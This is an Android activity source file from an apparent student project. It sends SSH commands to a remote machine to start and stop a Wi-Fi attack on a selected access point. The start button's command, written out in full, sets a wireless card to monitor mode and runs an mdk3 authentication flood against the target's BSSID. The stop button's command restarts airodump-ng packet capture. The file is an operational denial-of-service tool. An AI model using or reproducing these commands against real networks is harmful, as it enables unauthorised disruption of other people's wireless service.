package com.example.kn_project_app;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class AttackToggleAccessPoint extends AppCompatActivity implements MyCallback {

    TextView nameDevice;
    TextView macAddressDevice;
    TextView nameAccessPoint;
    TextView macAddressAccessPoint;
    Button startAttack;
    Button endAttack;
    TextView channelAndFreq;
    TextView status;

    private boolean mShouldUnbind;
    private SshOperations mBoundService;

    Handler handler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        handler = new Handler();

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attack_toggle_access_point);

        final Device device = getIntent().getExtras().getParcelable("device");

        final String attackCommand = "tmux kill-session -t kismet; tmux kill-session -t airodump; tmux new-session -d -s fakeAuth 'airmon-ng stop wlan1; airmon-ng start wlan1 " + device.getChannel() + " && mdk3 wlan1 a -a " + device.getBssid() + "'";
        final String endCommand = "tmux kill-session -t fakeAuth; tmux new-session -d -s airodump 'airmon-ng stop wlan1; airmon-ng start wlan1 && airodump-ng wlan1 --output-format netxml -w /tmp/recent'";
        final String statusToToastStarted = "Fake authentication launched";
        final String statusToToastEnded = "Fake authentication terminated";


        getSupportActionBar().setTitle(device.getName());

        nameDevice = findViewById(R.id.name);
        macAddressDevice = findViewById(R.id.macAddress);

        nameAccessPoint = findViewById(R.id.nameAccessPoint);
        macAddressAccessPoint = findViewById(R.id.macAddressAccessPoint);

        startAttack = findViewById(R.id.start);
        endAttack = findViewById(R.id.end);

        channelAndFreq = findViewById(R.id.channelAndFreq);
        status = findViewById(R.id.statusOfAttack);

        nameDevice.setText(device.getName());
        macAddressDevice.setText(device.getMacAddress());

        channelAndFreq.setText("Channel: " + device.getChannel() + " Freq: " + device.getFreqmhz());

        startAttack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d("WALACH","KLIKNIETO");
                Log.d("--------->", device.getChannel());
                new AttackToggleAccessPoint.executeCommand(AttackToggleAccessPoint.this, attackCommand,statusToToastStarted,"Started").execute();
            }
        });

        endAttack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new AttackToggleAccessPoint.executeCommand(AttackToggleAccessPoint.this,endCommand,statusToToastEnded,"Ended").execute();
            }
        });

    }

    @Override
    protected void onStart(){
        super.onStart();
        doBindService();
    };

    // ---------------------------------------
    // -------- MY CALLBACK METHODS ----------
    // ---------------------------------------

    public void changeAWSStatus(String text) {}
    public void updateText(String text){
        status.setText("Status: " + text);
    }

    // ---------------------------------------
    // ------ CONNECT TO SSH OPERATIONS ------
    // ---------------------------------------

    private ServiceConnection mConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName className, IBinder service) {
            mBoundService = ((SshOperations.LocalBinder)service).getService();
            mBoundService.setMainActivity(AttackToggleAccessPoint.this);
            Toast.makeText(AttackToggleAccessPoint.this,"TEMP: SSH Connection successfully transformed.", Toast.LENGTH_SHORT).show();
        }
        public void onServiceDisconnected(ComponentName className) {
            mBoundService = null;
            Toast.makeText(AttackToggleAccessPoint.this, "Goodbye SSHOperationClass", Toast.LENGTH_SHORT).show();
        }
    };

    void doBindService() {
        if (bindService(new Intent(AttackToggleAccessPoint.this, SshOperations.class), mConnection, Context.BIND_AUTO_CREATE)) {
            mShouldUnbind = true;
        } else {
            Log.e("MY_APP_TAG", "Error: The requested service doesn't " + "exist, or this client isn't allowed access to it.");
        }
    }

    void doUnbindService() {
        if (mShouldUnbind) {
            unbindService(mConnection);
            mShouldUnbind = false;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        doUnbindService();
    }

    // ---------------------------------------
    // - BACKGROUND TASK FOR SENDING COMMAND -
    // ---------------------------------------

    private class executeCommand extends AsyncTask<Integer, Void, Void> {
        MyCallback mainActivity;
        String command;
        String toastText;
        String stringToStatus;
        executeCommand (MyCallback mainActivity, String command, String toastText, String stringToStatus){
            this.mainActivity = mainActivity;
            this.command = command;
            this.toastText = toastText;
            this.stringToStatus = stringToStatus;
        }
        @Override
        protected Void doInBackground(Integer... params) {
            mBoundService.sendCommandToAWS(command);
            mainActivity.updateText(stringToStatus);
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(AttackToggleAccessPoint.this, toastText, Toast.LENGTH_SHORT).show();
                }
            });
            return null;
        }
    }

}
